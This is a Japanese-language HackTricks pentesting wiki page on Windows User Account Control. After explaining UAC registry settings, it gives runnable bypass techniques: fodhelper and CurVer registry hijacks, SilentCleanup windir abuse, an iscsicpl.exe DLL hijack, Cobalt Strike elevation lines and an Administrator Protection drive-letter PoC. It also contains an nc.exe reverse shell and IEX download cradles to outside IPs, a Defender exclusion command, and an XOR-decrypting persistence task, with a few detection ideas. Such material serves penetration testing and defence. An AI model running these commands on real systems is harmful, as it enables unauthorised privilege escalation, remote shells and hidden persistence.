# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格された操作に対する同意プロンプト**を有効にする機能です。アプリケーションにはそれぞれ異なる `integrity` レベルがあり、**高いレベル**のプログラムは、**システムを危険にさらす可能性のある**タスクを実行できます。UAC が有効な場合、管理者がアプリケーションやタスクにシステムへの管理者レベルのアクセス権を付与して実行することを明示的に承認しない限り、アプリケーションとタスクは常に**標準ユーザーアカウントのセキュリティコンテキストで実行**されます。これは、管理者を意図しない変更から保護する利便性のための機能ですが、セキュリティ境界とはみなされません。

integrity レベルの詳細については、以下を参照してください。


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC が導入されている場合、管理者ユーザーには 2 つのトークンが付与されます。1 つは通常の操作を medium integrity で実行するための標準ユーザートークンで、もう 1 つは管理者権限を持つトークンです。

この [ページ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) では、ログオンプロセス、ユーザーエクスペリエンス、UAC アーキテクチャを含め、UAC の仕組みについて詳しく説明しています。管理者は、セキュリティポリシーを使用して、組織に固有の UAC の動作をローカルレベル（secpol.msc を使用）で設定したり、Active Directory ドメイン環境で Group Policy Objects (GPO) を介して設定および配布したりできます。さまざまな設定については、[こちら](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)で詳しく説明されています。UAC には設定可能な Group Policy 設定が 10 個あります。以下の表に詳細を示します。

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: 組み込み Administrator アカウントの Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (無効)                                             |
| [User Account Control: Admin Approval Mode の管理者に対する昇格プロンプトの動作](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (secure desktop 上で Windows 以外のバイナリに対する同意を求める) |
| [User Account Control: 標準ユーザーに対する昇格プロンプトの動作](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (secure desktop 上で資格情報を求める)         |
| [User Account Control: アプリケーションのインストールを検出して昇格を求める](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (有効、Enterprise ではデフォルトで無効)           |
| [User Account Control: 署名および検証済みの実行可能ファイルのみを昇格する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (無効)                                             |
| [User Account Control: secure locations にインストールされた UIAccess アプリケーションのみを昇格する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (有効)                                              |
| [User Account Control: すべての管理者を Admin Approval Mode で実行する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (有効)                                              |
| [User Account Control: secure desktop を使用せずに UIAccess アプリケーションが昇格を求めることを許可する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (無効)                                             |
| [User Account Control: 昇格を求める際に secure desktop に切り替える](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (有効)                                              |
| [User Account Control: ファイルおよびレジストリへの書き込み失敗をユーザーごとの場所に仮想化する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (有効)                                              |

### Windows でソフトウェアをインストールするための Policies

**local security policies**（ほとんどのシステムでは "secpol.msc"）は、デフォルトで**非管理者ユーザーがソフトウェアをインストールすることを防止する**ように設定されています。つまり、非管理者ユーザーがソフトウェアの installer をダウンロードできたとしても、管理者アカウントなしでは実行できません。

### UAC に昇格を要求させる Registry Keys

管理者権限を持たない標準ユーザーとして、特定の操作を実行しようとした際に、**「標準」アカウントが UAC によって資格情報を要求される**ようにできます。この操作には特定の **registry keys** の変更が必要であり、**UAC bypass** が存在するか、攻撃者がすでに管理者としてログインしている場合を除き、管理者権限が必要です。

ユーザーが **Administrators** グループに所属している場合でも、これらの変更により、管理操作を実行するためにユーザーは**アカウントの資格情報を再入力**する必要があります。

**実際には、すでに elevated token、UAC bypass、またはこれらのキーを変更できる misconfiguration を取得している場合にのみ有用です。それ以外の場合、registry write 自体がブロックされます。**

変更する必要がある registry keys とエントリは以下のとおりです（括弧内はデフォルト値です）。

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

これは Local Security Policy ツールから手動で行うこともできます。変更後は、管理操作を実行する際にユーザーへ資格情報の再入力が求められます。

### Note

**User Account Control はセキュリティ境界ではありません。**したがって、standard users は local privilege escalation exploit なしにアカウントから脱出して管理者権限を取得することはできません。

### ユーザーに「コンピューターへの完全なアクセス」を要求する
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC 特権

- Internet Explorer Protected Mode は、integrity check を使用して、高い integrity level のプロセス（web browser など）が低い integrity level のデータ（temporary Internet files folder など）にアクセスするのを防ぎます。これは、browser を low-integrity token で実行することで実現されます。browser が low-integrity zone に保存されたデータへアクセスしようとすると、operating system はプロセスの integrity level を確認し、それに応じてアクセスを許可します。この機能は、remote code execution 攻撃によるシステム上の機密データへのアクセスを防ぐのに役立ちます。
- ユーザーが Windows に log on すると、システムはユーザーの特権一覧を含む access token を作成します。特権は、ユーザーの権限と capabilities の組み合わせとして定義されます。token にはユーザーの credentials の一覧も含まれます。これは、ユーザーをコンピューターおよびネットワーク上のリソースに対して authenticate するために使用される credentials です。

### Autoadminlogon

起動時に特定のユーザーへ Windows を自動的に log on させるには、**`AutoAdminLogon` registry key** を設定します。これは kiosk 環境や testing purposes に便利です。registry に password が露出するため、安全なシステムでのみ使用してください。

Registry Editor または `reg add` を使用して、次の keys を設定します。

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

通常の logon 動作に戻すには、`AutoAdminLogon` を 0 に設定します。

## UAC bypass

> [!TIP]
> victim へ graphical access がある場合、UAC bypass は簡単です。UAC prompt が表示されたときに "Yes" をクリックするだけでよいからです。

UAC bypass が必要になるのは、次の状況です。**UAC が有効で、プロセスが medium integrity context で実行されており、ユーザーが administrators group に所属している場合です。**

**UAC が最高の security level（Always）に設定されている場合は、他の levels（Default）の場合よりも bypass がはるかに困難です。**

### medium-integrity shell からの Fast triage

bypass を試す前に、適切な状況であることを確認し、host build を既知の動作する methods に対応付けます。
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
実践的な注意事項:
- `EnableLUA=0` の場合、bypass は必要ありません。任意の admin token から high integrity を直接要求できます。
- `ConsentPromptBehaviorAdmin=2` または `5` は、auto-elevate / COM-based bypasses で一般的なシナリオです。
- `Always Notify` はハードルを上げますが、失敗すると決めつけず、対象の正確な build でテストしてください。UACME は、最新の Windows build でも一部の `AlwaysNotify compatible` methods を引き続き追跡しています。

### UAC disabled

UAC がすでに無効（`ConsentPromptBehaviorAdmin` が **`0`**）の場合、次のような方法で **admin privileges**（high integrity level）を持つ reverse shell を **execute** できます:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### token duplication による UAC bypass

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **非常に**基本的な UAC "bypass"（ファイルシステムへの完全なアクセス）

Administrators グループに所属するユーザーの shell を持っている場合、SMB 経由で共有されている **C$**（ファイルシステム）をローカルの新しいディスクに **mount** できます。これにより、**ファイルシステム内のすべてにアクセス**できます（Administrator のホームフォルダーも含む）。

> [!WARNING]
> **この trick は現在は動作しないようです**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### cobalt strikeによるUAC bypass

Cobalt Strikeのtechniquesは、UACが最大のsecurity levelに設定されていない場合にのみ機能します
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** と **Metasploit** には、**UAC** を **bypass** するためのモジュールも複数あります。

### 昇格された COM インターフェース（`ICMLuaUtil` / `CMSTPLUA`）

自動昇格する COM オブジェクトは、最新のビルドでも実用的な UAC の攻撃対象です。`ICMLuaUtil` は現在の Windows ブランチでも動作するとして UACME で引き続き追跡されており、攻撃用ツールは、COM Elevation Moniker を呼び出す前に、interactive desktop process、64-bit execution、場合によっては PEB/process masquerading を組み合わせることで `CMSTPLUA` への対応を続けています。

実用的なヒント:
- ユーザーの **interactive session** で動作する **64-bit** プロセス（一般的には `explorer.exe` またはその子プロセス）を優先してください。
- raw shell が失敗した場合は、単純な `CreateProcess` wrapper ではなく、BOF / UACME implementation から再試行してください。
- child execution は **separate elevated process** で実行されることを想定してください。多くの BOF は現在の beacon をその場で昇格させません。

### KRBUACBypass

[https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) に documentation と tool があります。

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) は、複数の UAC bypass exploits をまとめた **compilation** です。UACME は **visual studio または msbuild を使用して compile する**必要があることに注意してください。compilation によって複数の executable（`Source\Akagi\outout\x64\Debug\Akagi.exe` など）が作成されるため、**どれが必要かを把握する必要があります。**\
一部の bypass は、何かが起きていることを **user** に **alert** する別のプログラムを **promtp** するため、**注意してください**。

UACME には、各 technique が動作し始めた **build version** が記載されています。自分のバージョンに影響する technique を検索できます:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
また、[このページ](https://en.wikipedia.org/wiki/Windows_10_version_history)を使用すると、ビルドバージョンから Windows リリース `1607` を特定できます。

実用的なワークフローでは、まず**ホストのビルドを評価**し、その後で一致する手法を実行します：
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` はローカルのビルドを既知の UAC methods と迅速に比較できるため、使用できなくなった PoC を早期に除外するのに役立ちます。
- `UACME` は、bypass を正確なビルドに対応付けるための、現在も最良の公開 catalogue です。最近の releases では新しい methods が追加され、既存の methods が **Windows 11 25H2** に対して再テストされました。そのため、古い blog post が現在も変更なく適用できると判断する前に、README/release notes を再確認してください。

### UAC Bypass – fodhelper.exe (Registry hijack)

信頼された binary である `fodhelper.exe` は、modern Windows では auto-elevated されます。起動時に、`DelegateExecute` verb を検証せずに、以下の per-user registry path を query します。そこに command を配置すると、Administrators グループに属する user の Medium Integrity process が、UAC prompt なしで High Integrity process を spawn できます。

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell steps (set your payload, then trigger)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
注意:
- 現在のユーザーが Administrators のメンバーで、UAC level が default/lenient の場合に動作します（追加の制限がある Always Notify では動作しません）。
- 64-bit Windows 上で 32-bit process から 64-bit PowerShell を起動するには、`sysnative` path を使用します。
- Payload には任意の command（PowerShell、cmd、または EXE path）を指定できます。stealth のため、UI の prompt は避けてください。

#### CurVer/extension hijack variant (HKCU only)

Recent samples abusing `fodhelper.exe` avoid `DelegateExecute` and instead **per-user の `CurVer` value を介して `ms-settings` ProgID を redirect** します。auto-elevated binary は引き続き `HKCU` 配下の handler を resolve するため、keys を plant するのに admin token は不要です:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
昇格後、マルウェアは一般的に `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` を `0` に設定して**今後のプロンプトを無効化**し、その後、追加の defense evasion（例: `Add-MpPreference -ExclusionPath C:\ProgramData`）を実行して、高い整合性で動作するよう persistence を再作成します。典型的な persistence task では、**XORで暗号化された PowerShell script**をディスク上に保存し、1時間ごとにメモリ内で復号して実行します。
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
この亜種も引き続き dropper をクリーンアップし、staged payloads だけを残すため、検出には **`CurVer` hijack**、`ConsentPromptBehaviorAdmin` の改ざん、Defender exclusion の作成、またはメモリ上で PowerShell を復号する scheduled tasks の監視が必要です。

### `SilentCleanup` task による UAC bypass（`HKCU\Environment\windir`）

`SilentCleanup` は `cleanmgr.exe` を最高権限で起動し、ユーザー環境変数から `%windir%` を展開します。`HKCU\Environment\windir` を制御できる場合、その展開先を任意の command にリダイレクトし、consent dialog なしで高整合性を取得できます。UACME がこの technique を有効な状態に保っており、最近の issue tracking では Windows 11 24H2 で必要なのはわずかな quoting の調整だけである可能性が示されているため、最近の build でもこの method は引き続きテストする価値があります。
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
その build でタスクがパスを引用符で囲む場合は、payload の末尾に引用符を付けて再試行してください（例: `cmd.exe"`）。テスト後は必ず `HKCU\Environment\windir` をクリーンアップしてください。

#### More UAC bypass

UI フロー、COM オブジェクト、またはデスクトップ操作を悪用する古典的な UAC bypass の多くは、被害者の **full interactive session** を必要とします。通常の `nc.exe` shell や **Session 0** で実行されている service では、多くの場合不十分です。

多くの場合、**meterpreter** session を使うことで解決できます。**Session** の値が **1** と等しい **process** に migrate してください:

![Point ms-settings to a custom extension (.thm) and map that extension to our payload - More UAC bypass: You can get using a meterpreter session. Migrate to a process that has the Session...](<../../images/image (863).png>)

(_explorer.exe_ should works)

### UAC Bypass with GUI

**GUI にアクセスできる場合、UAC prompt が表示されたときにそのまま承認できます**。技術的な bypass は実際には必要ありません。そのため、GUI session を取得するだけで、UAC によって追加される実際上の制約を bypass できることがよくあります。

さらに、誰かが使用中の GUI session（RDP 経由の可能性があります）を取得した場合、そこでは **administrator として実行されているツールが存在する**ことがあります。そのツールから、例えば **cmd** を **admin として実行**すれば、UAC による再度の prompt なしで直接 **run** できます。[**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif) のような方法です。こちらのほうがやや **stealthy** な場合があります。

### Noisy brute-force UAC bypass

noisy であることを気にしないのであれば、[**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) のようなものを **run** して、**user が承認するまで権限の elevate を要求し続ける**こともできます。

### Your own bypass - Basic UAC bypass methodology

**UACME** を確認すると、**多くの UAC bypass が DLL hijacking を悪用している**ことに気付くでしょう（多くの場合、elevated binary に writable path から attacker-controlled DLL を load させます）。[DLL hijacking vulnerability の見つけ方については、こちらを読んでください](../windows-local-privilege-escalation/dll-hijacking/index.html)。

1. **autoelevate** する binary を見つけます（実行時に high integrity level で run されることを確認します）。
2. procmon を使って、**DLL Hijacking** に対して脆弱な可能性がある "**NAME NOT FOUND**" event を見つけます。
3. DLL を **protected paths**（C:\Windows\System32 など）内に **write** する必要があるでしょう。しかし、そこには write permissions がありません。以下を使用して bypass できます:
1. **wusa.exe**: Windows 7、8、8.1。high integrity level から実行される tool であるため、CAB file の content を protected paths 内に extract できます。
2. **IFileOperation**: Windows 10。
4. DLL を protected path 内に copy し、脆弱な autoelevated binary を execute する **script** を prepare します。

### Another UAC bypass technique

**autoElevated binary** が、**execute** される **binary** または **command** の **name/path** を **registry** から **read** しようとしているかを監視します（binary がこの情報を **HKCU** 内で検索する場合は、より興味深いものになります）。

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

32-bit の `C:\Windows\SysWOW64\iscsicpl.exe` は **auto-elevated** binary であり、search order によって `iscsiexe.dll` を load させるために悪用できます。**user-writable** folder 内に malicious な `iscsiexe.dll` を配置し、現在の user の `PATH`（例えば `HKCU\Environment\Path` 経由）を変更してその folder が検索されるようにすると、Windows は UAC prompt を表示せず、elevated な `iscsicpl.exe` process 内に attacker DLL を load する可能性があります。

実用上の注意:
- これは、現在の user が **Administrators** に所属しているものの、UAC により **Medium Integrity** で実行されている場合に useful です。
- この bypass で関係するのは **SysWOW64** の copy です。**System32** の copy は別の binary として扱い、behavior を個別に validate してください。
- この primitive は **auto-elevation** と **DLL search-order hijacking** の組み合わせです。そのため、他の UAC bypass で使用する ProcMon workflow と同じ方法が、missing DLL load の validate に useful です。

Minimal flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
検出のアイデア:
- `reg add` / `HKCU\Environment\Path` へのレジストリ書き込みの直後に、`C:\Windows\SysWOW64\iscsicpl.exe` が実行されていないかアラートを出す。
- `%TEMP%` や `%LOCALAPPDATA%\Microsoft\WindowsApps` など、**ユーザーが制御可能な**場所にある `iscsiexe.dll` をハントする。
- `iscsicpl.exe` の起動と、想定外の子プロセスや通常の Windows ディレクトリ外からの DLL ロードを相関分析する。

### 個別に確認する価値のある新しい研究

2024 年以降の一部の chain は、従来の `HKCU\Software\Classes` レジストリ hijack とは異なる動作をします。例えば、activation-context cache poisoning は **drive remap** と **DLL redirection** を chain し、`ctfmon.exe` や、後続のターゲットである `fodhelper.exe` など、信頼された UI / auto-elevated binary を介して medium integrity から high integrity へ移行できます。ここで大規模な PoC を重複して掲載する代わりに、以下にある簡潔な payload の例を確認してください:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) の per-logon-session DOS device map を介した drive-letter hijack

Windows 11 25H2 における完全な `RAiLaunchAdminProcess` / UIAccess attack surface については、専用ページを確認してください:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 の「Administrator Protection」は、per-session の `\Sessions\0\DosDevices/<LUID>` map を持つ shadow-admin token を使用します。このディレクトリは、最初の `\??` resolution 時に `SeGetTokenDeviceMap` によって遅延作成されます。攻撃者が shadow-admin token を **SecurityIdentification** のみに impersonate すると、ディレクトリは攻撃者を **owner** として作成されます（`CREATOR OWNER` を継承するため）。これにより、`\GLOBAL??` よりも優先される drive-letter link を作成できます。

**手順:**

1. low-privileged session から `RAiProcessRunOnce` を呼び出し、promptless な shadow-admin `runonce.exe` を spawn する。
2. その primary token を **identification** token に duplicate し、`\??` を open して攻撃者の所有権で `\Sessions\0\DosDevices/<LUID>` を強制的に作成している間、これを impersonate する。
3. そこに攻撃者が制御する storage を指す `C:` symlink を作成する。この session で後続の filesystem access が `C:` を攻撃者の path として resolve するようになり、prompt なしで DLL/file hijack が可能になる。

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## 参考資料
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – User Account Control の仕組み](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [WinPwnage – UAC bypass compatibility scanner and launcher](https://github.com/rootm0s/WinPwnage)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 東南アジア政府の標的に対する 0-Day Exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Windows Administrator Protection の bypass](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [Project Zero – UI Access の悪用による Administrator Protection の bypass](https://projectzero.google/2026/02/windows-administrator-protection.html)
- [Sigma / Detection.FYI – SilentCleanup Task を使用した UAC bypass](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
